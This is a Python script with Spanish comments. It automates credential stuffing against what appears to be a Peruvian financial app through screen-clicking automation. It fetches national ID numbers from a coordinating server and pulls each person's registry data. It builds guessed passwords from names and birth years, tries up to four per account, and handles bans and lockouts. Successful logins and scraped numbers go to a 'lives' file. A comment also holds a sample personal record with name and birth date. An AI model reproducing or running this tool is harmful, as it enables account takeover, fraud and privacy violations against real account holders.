import pyautogui as p
import time
import requests
import PosiblesPass
import ObtenerDataReniec
from printy import printy
import threading
import json
import reconocerTexto


DEATH_1 = "./imagenes/death_1.png"
DEATH_2 = "./imagenes/death_2.png"
VALIDAR_1 = "./imagenes/validar_1.png"  # COntrase;a incorrecta
VALIDAR_2 = './imagenes/validar_2.png' # Usuario bloqueado
BAN = './imagenes/ban.png'
LIVE = './imagenes/live.png'

#Url = 'https://jackelinos.azurewebsites.net'
Url = 'http://192.168.18.3:5000'

IngresarNumDocumento =  890,386
IngresarNumDocumentoMedio = 771,390

cerrar_apliacion = 1255,986
borrartodo = 1159,111
presionar_aplicacion = 1150,204

def verificarBAN(BAN,bansito):
    bansito = p.locateOnScreen(BAN, grayscale=True, confidence=0.9, region=(686,448,1221,640))
    #print(f"bansito: {bansito}")
    if bansito!=None:
        #input("BAN TEST POR ESO PARADO")
        time.sleep(0.2)
        p.click(1122,585) # click en aceptar
        time.sleep(0.3)
        return True
def verContrasena():
    time.sleep(0.2)
    p.click(1176,360) # clik en el ojito


def cerrar_app():
    time.sleep(3)
    p.click(cerrar_apliacion)
    time.sleep(3)
    p.click(borrartodo)
    time.sleep(3)
    p.click(presionar_aplicacion)
    time.sleep(10)
    
#    - - -- - -- Version nueva --- - - - -- - 

def obtener_Dni_pachambear(proceso):
    try:
        api_url = f'{Url}/obtener_DNI_Trabajador'
        #api_url = 'http://192.168.18.3:5000/obtener_DNI_Trabajador'

        data = {
            'proceso': proceso  
        }

        json_data = json.dumps(data)
        headers = {'Content-Type': 'application/json'}
        resultado = requests.post(api_url, data=json_data, headers=headers)


        if resultado.status_code == 200:
            dni_info = resultado.json()
            dni = dni_info.get("DNI")
                
            return dni
        else:
            print("Error en la solicitud a la API.")
            return None
    except Exception as e:
        print("Error durante la solicitud a la API:", str(e))
        return None
    
def agregarEditarUsuarioA_la_DB(dni,status,proceso):
    try:
        api_url = f'{Url}/actualizar_usuario'

        data = {
            "DNI": dni,
            "Status": status,
            "Procesado": proceso
        }

        json_data = json.dumps(data)
        headers = {'Content-Type': 'application/json'}
        resultado = requests.put(api_url, data=json_data,headers=headers)

        #print("Status Code:", resultado.status_code)
        #print("Response Content:", resultado.content)

        if resultado.status_code == 200:
            response = resultado.json()
            print(response)
            
        else:
            print("Error en la solicitud a la API.")
            return None
    except Exception as e:
        print("Error durante la solicitud a la API:", str(e))
        return None
    
    
    
def procesar_lote(proceso):
    linealote = 0

    while True:
        #print( '\n / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / /')
        print( '\n------------------------------------------------------------------------------')

        inicio = time.time()  # Guarda el tiempo actual antes de llamar a la función
        dni = obtener_Dni_pachambear(proceso)
        fin = time.time()  # Guarda el tiempo actual después de llamar a la función
        print(f"Tiempo de ejecución: {fin - inicio} segundos")
        
        #print(f'dni es este {dni}')
        #input('detenido')

        if dni is None:
            break

        try:
            linealote += 1
            PosicionContrasena = 1 # Solo para mover la posicion de la contraseña
            
            
            #print(f'DNI : line > > > ')
            elDNI= dni
            print(f" - N° {linealote}  |  DNI > > > {elDNI}")
            
            p.doubleClick(IngresarNumDocumentoMedio) # para ingresar el numero del documento
            time.sleep(0.1) # esperar un rato para que no se bugee
            p.typewrite(elDNI, interval=0.02)
            time.sleep(0.2) 

            #Hacer un bucle para que le de en continuar si o si luego
            p.click(944,516)    #Click en continuar
            
            #Verificar 
            rojo =  False
            d1 = None
            v1= None
            v2 = None
            live = None
            bansito = None

            time.sleep(0.5)
            
            while True:
                time.sleep(0.1) # para reducir la velocidad del bucle
                
                #Verificar si es BAN
                if verificarBAN(BAN,bansito):
                    print(f'BAN > > > {elDNI} > > Guardado')
                    
                    #Cambiar en la base de datos a 0 para volver a intentarlo

                    #TRABAJO NO FINALIZADO POR BAN
                    hilo2 = threading.Thread(target=agregarEditarUsuarioA_la_DB, args=(elDNI,"ban app", "0" )) #Agregando al ban
                    hilo2.start()
                
                    break
                
                #Acceso contrasena
                rojo = p.pixelMatchesColor(774,250,(236,17,26))
                #print(f"rojo: {rojo}")
       
                if rojo is True:      # Deja poner la contrasena 
                    
                    #Conseguir contrasena
                    
                    line = ObtenerDataReniec.obtener_datos_dni(elDNI)
                    print("obteniendo datos")
                    print(f' - {line} > > >') # 07542837|GLEDIS|REATEGUI|MONTES|30/04/1953
                    if line == 'ERROR': #No mas por si hay un error al traer la data por si el DNI no existe
                        print('ERROR AL OBTENER DATOS DEL DNI > > > omitiendo...')
                        time.sleep(0.2)
                        p.press('esc') # para salir al menu principal
                        time.sleep(0.3)
                        
                        hilo3 = threading.Thread(target=agregarEditarUsuarioA_la_DB, args=(elDNI,'ERROR AL OBTENER DATOS DEL DNI', "1" ))
                        hilo3.start()
                        break
                    
                    data = PosiblesPass.procesar_cadena(line) #PRocesando la cadena completa a contraseñas
                    # ['07542837', 'Gledis1953', 'Gledis1234', 'Reategui1953', 'Montes1953']
                    
                    p.click(1011,366) #Click en el lugar del contrasena
                    time.sleep(0.1)
                    p.typewrite(data[PosicionContrasena], interval=0.02) # escirbir la pass
                    #verContrasena()
                    time.sleep(0.1)
                    p.click(951,565) # click en iniciar sesion
                    #Verificar si es valido o no
                    while (v1 is None) and (v2 is None):
                        time.sleep(0.1) # para reducir la velocidad del bucle
                        p.moveTo(1012,76)
                        
                        #Verificar si es BAN
                        if verificarBAN(BAN,bansito):
                            print(f'N° {linealote} : BAN > > > {elDNI} > > Guardado')

                            #TRABAJO NO FINALIZADO POR BAN
                            hilo4 = threading.Thread(target=agregarEditarUsuarioA_la_DB, args=(elDNI,"ban app", "0" )) #Agregando al ban
                            hilo4.start()
                            
                            #print(resultado.text)  # Imprime el contenido de la respuesta
                            
                            #acá dentro el ban es en pass
                            time.sleep(0.3)
                            p.press('esc') # para salir al menu principal
                            time.sleep(0.3)
                            break
                        
                        v1 = p.locateOnScreen(VALIDAR_1, grayscale=True, confidence=0.9, region=(700,468,1216,626))
                        #print(f"v1: {v1}")
                        if v1!=None: #Documento o contrasena invalida
                            printy(f" - > {data[PosicionContrasena]}  | Documento o contrasena invalida","rI")
                            time.sleep(0.2)
                            p.click(1129,582) # Click en aceptar
                            time.sleep(0.3)
                            
                            if PosicionContrasena < 4: # Por si la contrasena es la 4ta y no esta baneado aun
                                PosicionContrasena += 1
                                
                                p.click(1011,366) #Click en el lugar del contrasena
                                time.sleep(0.1)
                                p.typewrite(data[PosicionContrasena], interval=0.02) # escirbir la pass
                                #verContrasena()
                                time.sleep(0.1)
                                p.click(951,565) # click en iniciar sesion
                                time.sleep(0.3)
                                
                                v1 = None
                                continue
                            
                            time.sleep(0.2)
                            p.press('esc') # para salir al menu principal
                            time.sleep(0.3)
                            
                            hilo5 = threading.Thread(target=agregarEditarUsuarioA_la_DB, args=(elDNI,"contrasena invalida", "1" ))
                            hilo5.start()
                    
                            break
                               
                        
                        v2 = p.locateOnScreen(VALIDAR_2, grayscale=True, confidence=0.9, region=(695,419,1213,669))
                        #print(f"v2: {v2}")
                        if v2!=None:
                            printy("Usuario bloqueado, Has superado el numero de intentos permitidos","y")
                            time.sleep(0.2)
                            p.click(1019,620) # Click en cancelar
                            time.sleep(0.2)
                            p.press('esc') # para salir al menu principal
                            time.sleep(0.3)
                            
                            
                            #agregarStatusDB(elDNI,"Usuario bloqueado")
                            hilo6 = threading.Thread(target=agregarEditarUsuarioA_la_DB, args=(elDNI,"Usuario bloqueado", "1" ))
                            hilo6.start()
                            
                            break
                        
                        #LIVE
                        live = p.locateOnScreen(LIVE, grayscale=True, confidence=0.9, region=(673,130,1229,452))
                        #print(f"live: {live}")
                        if live!=None:
                            
                            p.screenshot("img_Num.png",region=(691,536,372,58))
                            image = "img_Num.png"
                            txt_Numero = reconocerTexto.detect_text_from_image(image)
                            
                            time.sleep(0.2)
                            p.click(714,105) # Click para retroceder
                            time.sleep(0.2)
                            p.press('esc') # para salir al menu principal
                            time.sleep(0.3)
                            
                            printy(f" LIVE -> {elDNI} pass: {data[PosicionContrasena]} -> {txt_Numero}")
                            
                            text = f" LIVE -> {elDNI} pass: {data[PosicionContrasena]} -> {txt_Numero}".rstrip()
                            lives = open("./data/lives.txt","a")
                            lives.write(text) # escribir en el block
                            lives.write("\n")
                            lives.close()
                            
                            hilo7 = threading.Thread(target=agregarEditarUsuarioA_la_DB, args=(elDNI,"Live pass: "+data[PosicionContrasena]+ " -> " + txt_Numero, "1" ))
                            hilo7.start()

                            time.sleep(0.3)
                            cerrar_app()
                            time.sleep(0.2)
                            break  
                    break

                #DEATH 1 > > > INFORMACION DE LA TARJETA ( PIDE REGISTRAR LA TARJETA )
                d1 = p.locateOnScreen(DEATH_1, grayscale=True, region=(683,48,1233,120))
                #print(f"d1: {d1}")
                if d1!=None:
                    #print("INFORMACION DE LA TARJETA ( PIDE REGISTRAR LA TARJETA )")
                    printy(f'DEATH > > > {elDNI} > > INFORMACION DE LA TARJETA ( PIDE REGISTRAR LA TARJETA )',"cU")
                    #agregarStatusDB(elDNI,"PIDE REGISTRAR LA TARJETA")
                    
                    hilo8 = threading.Thread(target=agregarEditarUsuarioA_la_DB, args=(elDNI,"PIDE REGISTRAR LA TARJETA", "1" ))
                    hilo8.start()
                    
                    time.sleep(0.1)
                    p.click(712,107) # click en para atras para retroceder
                    break
                
                # DEATH 2 > > > No tienes cuenta con nosotros
                d2 = p.locateOnScreen(DEATH_2, grayscale=True, region=(685,502,1242,740)) #grande imagen
                #print(f"d1: {d1}")
                if d2!=None:
                    printy(f'DEATH > > > {elDNI} > > > No tienes cuenta con nosotros',"cU")

                    #agregarStatusDB(elDNI,"No tienes cuenta con nosotros")
                    #hilo9 = threading.Thread(target=agregarStatusDB, args=(elDNI,"No tienes cuenta con nosotros"))
                    hilo9 = threading.Thread(target=agregarEditarUsuarioA_la_DB, args=(elDNI,"No tienes cuenta con nosotros", "1" ))
                    hilo9.start()

                    #print("No tienes cuenta con nosotros")
                    time.sleep(0.1)
                    p.click(988,613) # Click en ahora NO para retroceder
                    break


        except Exception as e:
            # Captura la excepción y obtén el mensaje de error
            mensaje_error = str(e)

            # Imprime el mensaje de error
            print(f"Ocurrió un error: {mensaje_error}")


if __name__ == "__main__":

    opcion_elegida = int(input("\nElige una Trabajador: "))

    #Para los escoltas cambiar esto:
    #           procesar_lote(10)     # depende que numero y hacerlo .exe

    try:
        procesar_lote(opcion_elegida)
    except Exception as e:
        print(f"Ocurrió un error al procesar el lote")